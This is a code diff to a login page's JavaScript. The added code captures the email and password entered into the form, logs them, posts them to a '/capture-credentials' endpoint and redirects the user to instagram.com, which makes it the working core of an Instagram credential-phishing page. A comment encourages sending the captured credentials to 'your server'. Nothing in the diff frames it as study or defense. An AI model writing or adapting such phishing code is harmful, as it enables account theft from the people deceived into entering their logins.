@@ -13,6 +13,29 @@ document.addEventListener("DOMContentLoaded", function() {
 
     loginForm.addEventListener("submit", function(event) {
         event.preventDefault();
-        console.log("Form submitted with email:", emailInput.value, "and password:", passwordInput.value);
+        
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        console.log("Form submitted with email:", email, "and password:", password);
+
+        // Capture credentials logic (you can send these to your server)
+        fetch('/capture-credentials', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email: email, password: password })
+        }).then(response => {
+            if (response.ok) {
+                console.log('Credentials captured successfully');
+                // Redirect to Instagram
+                window.location.href = "https://www.instagram.com";
+            } else {
+                console.error('Failed to capture credentials');
+            }
+        }).catch(error => {
+            console.error('Error capturing credentials:', error);
+        });
     });
 });
